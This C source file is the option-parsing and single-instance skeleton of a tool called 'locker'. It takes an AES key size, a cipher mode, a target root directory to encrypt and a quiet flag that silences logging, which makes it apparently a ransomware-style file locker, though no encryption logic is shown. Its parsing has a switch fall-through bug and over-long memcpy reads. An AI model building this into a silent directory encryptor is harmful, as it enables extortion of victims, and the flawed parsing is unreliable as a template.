#include "locker.h"

FILE* logger = 0;

int main(int argc, char** argv, char** envp)
{
    logger = stdout;
    int key_size = 0;
    char mode[MAX_MODE_LENGTH] = {0, };
    char target[MAX_TARGET_LENGTH] = {0, };

    if (!parse_options(&key_size, mode, target, argc, argv))
    {
        print_usage();
        return EXIT_FAILURE;
    }
    fprintf(logger, "[+] bits: %d\n", key_size);
    fprintf(logger, "[+] mode: %s\n", mode);
    fprintf(logger, "[+] target: %s\n", target);

    if (is_already_running())
    {
        fprintf(logger, "[-] the another process is already running!\n");
        return EXIT_FAILURE;
    }

    sem_unlink(SEM_NAME);
    if (logger->_fileno != stdout->_fileno)
    {
        fclose(logger);
    }
    return EXIT_SUCCESS;
}

void print_usage()
{
    char* man = "" \
        "Usage: \n" \
        "    ./locker [options] \n" \
        "\n" \
        "Options: \n" \
        "    -b, --bits         required, number of bits for AES encryption key (128, 192, 256)\n" \
        "    -m, --mode         required, AES cipher block mode to use (aes-ecb, aes-cbc)\n" \
        "    -t, --target       required, target root directory path to encrypt (length is must be 256 under)\n" \
        "    -q, --quiet        optional, disable to logging \n";
    fprintf(stderr, "%s\n", man);
}

int parse_options(int* key_size, char* mode, char* target, int argc, char** argv)
{
    int opt = 0;
    int opt_idx = 0;
    struct option options[] = {
        {"quiet", no_argument, 0, 'q'},
        {"bits", required_argument, 0, 'b'},
        {"mode", required_argument, 0, 'm'},
        {"target", required_argument, 0, 't'},
        {0, 0, 0, 0},
    };
    while ((opt = getopt_long(argc, argv, "b:m:t:q", options, &opt_idx)) != -1)
    {
        switch (opt)
        {
        case 0:
            switch (opt_idx)
            {
            case 1:
                *key_size = atoi(optarg);
                break;
            case 2:
                memcpy(mode, optarg, MAX_MODE_LENGTH-1);
                break;
            case 3:
                memcpy(target, optarg, MAX_TARGET_LENGTH-1);
                break;
            }
        case 'q':
            logger = fopen("/dev/null", "w");
            break;
        case 'b':
            *key_size = atoi(optarg);
            break;
        case 'm':
            memcpy(mode, optarg, MAX_MODE_LENGTH-1);
            break;
        case 't':
            memcpy(target, optarg, MAX_TARGET_LENGTH-1);
            break;
        default:
            return 0;
        }
    }
    return 1;
}

int is_already_running()
{
    if (sem_open(SEM_NAME, O_CREAT|O_EXCL, 0666, 1) == SEM_FAILED)
    {
        return errno == EEXIST;
    }
    return 0;
}